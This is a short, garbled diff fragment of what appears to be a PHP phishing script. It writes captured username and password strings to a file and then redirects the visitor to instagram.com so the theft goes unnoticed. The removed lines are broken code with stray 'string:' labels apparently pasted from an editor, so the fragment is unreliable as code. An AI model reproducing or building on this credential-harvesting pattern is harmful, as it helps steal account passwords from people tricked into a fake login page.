@@ -10,10 +10,3 @@ fwrite($fp,
 fclose($fp);
 
 header( string: 'Location: https://instagram.com');
-
-string: 'Password: ' .
-string:
-
-. $username . "\n");
-$password . "\n");
-"\n");
